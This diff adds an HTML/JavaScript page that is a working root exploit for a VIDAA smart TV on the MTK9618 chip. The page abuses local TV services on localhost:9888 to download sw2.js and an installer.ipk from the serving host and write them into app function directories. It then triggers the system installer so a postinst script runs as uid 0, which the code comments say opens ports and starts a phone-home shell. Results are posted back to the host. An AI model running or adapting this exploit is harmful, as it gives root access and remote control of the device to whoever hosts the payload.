@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>alvidaa ipk</title>
+<style>
+  html, body { margin: 0; padding: 0; background: #000; color: #ccc; }
+  #out { font: 19px/1.4 Menlo, Consolas, monospace; white-space: pre-wrap;
+         word-break: break-all; padding: 10px; }
+  .ok { color: #8f8; } .err { color: #f88; } .warn { color: #fd6; } .hdr { color: #6cf; }
+  .big { font-size: 26px; font-weight: bold; }
+</style>
+</head>
+<body>
+<div id="out"></div>
+<script>
+(function () {
+  "use strict";
+  /*
+   * Root lane for MTK9618: fetcher -> superwatch -> IPK postinst (uid 0).
+   * The IPK carries no binaries; its postinst is a shell script that
+   *   - writes /var/local/alvidaa/proof.txt
+   *   - creates /var/local/pfmParse (+ PFMCheck, platform.txt, DebugPowerup)
+   *   - opens 2222/8008, starts a phone-home shell
+   * Reversible: uninstall the package, delete /var/local/alvidaa + /var/local/pfmParse.
+   */
+  var BASE = "http://" + location.host + "/pub/ipk/";
+  var FN_DIRS = [
+    "pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch",
+    "pkgs/tv.vidaa.jsservice.system/current/functions/fetch",
+    "pkgs/tv.vidaa.jsservice.system/CHA/functions/fetch"
+  ];
+  var TRIGGER_URLS = [
+    "https://localhost:9888/function/basic/fetch/sw2",
+    "https://localhost:9888/function/system/fetch/sw2"
+  ];
+  var TRIGGER_BODY = JSON.stringify({ list: [
+    "90:83:90;re.installer",
+    "91:82:91;/APPS/installer.ipk;re.installer;"
+  ]});
+
+  var el = document.getElementById("out");
+  var rep = { started: new Date().toISOString(), ua: navigator.userAgent, steps: {} };
+
+  function out(t, c) {
+    var d = document.createElement("div");
+    d.textContent = t;
+    if (c) d.className = c;
+    el.appendChild(d);
+    window.scrollTo(0, document.body.scrollHeight);
+  }
+  function norm(m) {
+    if (m == null) return "";
+    if (typeof m === "string") return m;
+    try { return JSON.stringify(m); } catch (e) { return String(m); }
+  }
+  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+
+  function rd(p) {
+    try {
+      var r = HiUtils_createRequest("fileRead", { path: [p], mode: 6 });
+      if (r && typeof r === "object") return { ret: r.ret, msg: norm(r.msg).slice(0, 20000) };
+      return { ret: true, msg: norm(r).slice(0, 20000) };
+    } catch (e) { return { ret: false, msg: "EXC " + e }; }
+  }
+  async function rdWait(p, tries, ms) {
+    var r = null;
+    for (var i = 0; i < (tries || 6); i++) {
+      r = rd(p);
+      if (r.ret === true && String(r.msg).length > 0) return r;
+      await sleep(ms || 1500);
+    }
+    return r;
+  }
+  function fetchTo(url, target, perm) {
+    var args = { url: url, directory: target, permission: perm || 420 };
+    var r;
+    try {
+      r = vowOS.service.syncExecute("basic/fetcher",
+        { api: "fetchFile", args: JSON.stringify(args) });
+    } catch (e) { return { ok: false, msg: "EXC " + e }; }
+    var s = norm(r);
+    return { ok: (r && r.ret === true) || s.indexOf("download finished") !== -1, msg: s.slice(0, 200) };
+  }
+  function startFetcher() {
+    return new Promise(function (resolve) {
+      var ws, done = false;
+      function fin(m) { if (!done) { done = true; try { ws && ws.close(); } catch (e) {} resolve(m); } }
+      try { ws = new WebSocket("wss://localhost:9888"); }
+      catch (e) { return fin("ws EXC " + e); }
+      ws.onopen = function () {
+        try {
+          ws.send(JSON.stringify({ path: "phoenix://service/basic/fetcher", method: "start",
+                                   parameters: {}, session: 901, timeout: 10 }));
+        } catch (e) {}
+        setTimeout(function () { fin("fetcher start sent"); }, 1200);
+      };
+      ws.onerror = function () { fin("ws error"); };
+      setTimeout(function () { fin("ws timeout"); }, 5000);
+    });
+  }
+  function triggerOnce(url) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", url, false);
+      x.setRequestHeader("identifier", "");
+      x.send(TRIGGER_BODY);
+      return { url: url, status: x.status, text: String(x.responseText || "").slice(0, 400) };
+    } catch (e) { return { url: url, exc: e.name + ": " + e.message }; }
+  }
+  async function post() {
+    try {
+      var x = await fetch("/collect", { method: "POST",
+        headers: { "Content-Type": "application/json" }, body: JSON.stringify(rep) });
+      return "HTTP " + x.status;
+    } catch (e) { return "EXC " + e; }
+  }
+
+  async function main() {
+    out("alvidaa ipk installer — " + new Date().toISOString(), "hdr");
+    out("");
+
+    out("1) где живёт FaaS-функция fetch", "hdr");
+    var dirs = [];
+    for (var i = 0; i < FN_DIRS.length; i++) {
+      var r = rd(FN_DIRS[i]);
+      var isDir = String(r.msg).indexOf("EISDIR") !== -1;
+      rep.steps["dir:" + FN_DIRS[i]] = r;
+      out("   " + (isDir ? "[DIR] " : "[--]  ") + FN_DIRS[i] + "   " +
+          String(r.msg).replace(/\s+/g, " ").slice(0, 80), isDir ? "ok" : "warn");
+      if (isDir) dirs.push(FN_DIRS[i]);
+    }
+    out("");
+
+    out("2) заливка sw2.js", "hdr");
+    out("   " + (await startFetcher()), "warn");
+    var sw2target = null;
+    for (var d = 0; d < dirs.length && !sw2target; d++) {
+      var tgt = dirs[d] + "/sw2.js";
+      var w = fetchTo(BASE + "sw2.js", "/APPS/" + tgt, 420);
+      rep.steps["sw2@" + tgt] = w;
+      out("   -> " + tgt + "   " + w.msg, w.ok ? "ok" : "err");
+      var back = await rdWait(tgt, 3, 800);
+      if (back.ret === true && String(back.msg).indexOf("superwatch_socket") !== -1) sw2target = tgt;
+      out("   readback: " + (sw2target ? "OK" : "нет"), sw2target ? "ok" : "warn");
+    }
+    if (!sw2target) {
+      out("sw2.js лечь не смог — триггер не делаем", "err big");
+      await post();
+      return;
+    }
+    out("");
+
+    out("3) заливка installer.ipk", "hdr");
+    var wi = fetchTo(BASE + "installer.ipk", "/APPS/installer.ipk", 420);
+    rep.steps.ipk = wi;
+    out("   " + wi.msg, wi.ok ? "ok" : "err");
+    var ib = await rdWait("installer.ipk", 3, 800);
+    var ipkOk = ib.ret === true && String(ib.msg).length > 500;
+    out("   readback: " + (ipkOk ? "OK (" + String(ib.msg).length + " bytes)" : "нет"), ipkOk ? "ok" : "err");
+    if (!ipkOk) {
+      out("IPK не лёг — триггер не делаем", "err big");
+      await post();
+      return;
+    }
+    out("");
+
+    out("4) superwatch: 83 (uninstall) + 82 (install)", "hdr");
+    var tried = [];
+    for (var u = 0; u < TRIGGER_URLS.length; u++) {
+      var tr = triggerOnce(TRIGGER_URLS[u]);
+      tried.push(tr);
+      rep.steps["trigger:" + TRIGGER_URLS[u]] = tr;
+      out("   " + tr.url.replace("https://localhost:9888", "") + " -> " +
+          (tr.exc ? "EXC " + tr.exc : "[" + tr.status + "] " + tr.text.slice(0, 160)),
+          tr.exc ? "err" : "ok");
+      if (!tr.exc && String(tr.text).indexOf("got error") === -1 && String(tr.text).length > 0) break;
+    }
+    out("");
+
+    out("5) журнал установщика (ждать до 20 с)", "hdr");
+    var logR = await rdWait(".alvidaa/installer_log.txt", 10, 2000);
+    rep.steps.log = logR;
+    var logTxt = logR.ret === true ? String(logR.msg) : "";
+    out("   log: " + (logR.ret === true ? logTxt.length + " chars" : "нет"), logR.ret === true ? "ok" : "err");
+    if (logTxt) {
+      var lines = logTxt.split("\n");
+      for (var k = 0; k < lines.length && k < 60; k++) out("   " + lines[k]);
+    }
+    out("");
+
+    var proof = await rdWait("../var/local/alvidaa/proof.txt", 4, 1500);
+    rep.steps.proof = proof;
+    var proofTxt = proof.ret === true ? String(proof.msg) : "";
+    out("6) proof.txt", "hdr");
+    out("   " + (proofTxt ? proofTxt.replace(/\s+/g, " ").slice(0, 400) : "нет"), proofTxt ? "hdr" : "err");
+    out("");
+
+    rep.verdict = (proofTxt.indexOf("uid=0") !== -1) ? "ROOT" :
+                  (logTxt.indexOf("=== done") !== -1) ? "LOG-ONLY" : "NO-ROOT";
+    var up = await post();
+    if (rep.verdict === "ROOT") {
+      out("ГОТОВО: postinst отработал от uid=0", "ok big");
+    } else if (rep.verdict === "LOG-ONLY") {
+      out("postinst дошёл до конца, но proof.txt не читается — смотри лог", "warn big");
+    } else {
+      out("рута пока нет — лог выше покажет, где встало", "err big");
+    }
+    out("report " + up, "hdr");
+  }
+
+  main().catch(function (e) { rep.fatal = String(e); out("FATAL " + e, "err"); post(); });
+})();
+</script>
+</body>
+</html>
